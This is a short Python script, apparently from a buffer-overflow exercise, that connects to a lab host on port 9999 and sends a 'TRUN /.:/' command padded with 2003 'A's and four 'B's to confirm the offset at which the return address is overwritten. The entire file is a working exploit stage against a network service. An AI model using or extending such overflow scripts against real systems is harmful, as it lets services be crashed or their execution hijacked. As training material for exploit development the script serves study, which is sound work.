#!/usr/bin/python3
import sys
import socket 

HOST='192.168.203.149'
PORT=9999

shellCode = "A"*2003 + "B"*4 #offset 2003 byte A=41 B=42
try:
                
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
        
    client.send(("TRUN /.:/" + shellCode).encode())
        
    #response = client.recv(1024)
    #print(response.decode('utf-8'))
    client.close()
        
    print(f'Send success!!')

except Exception as e:
    print(e)
    print(f'fail')

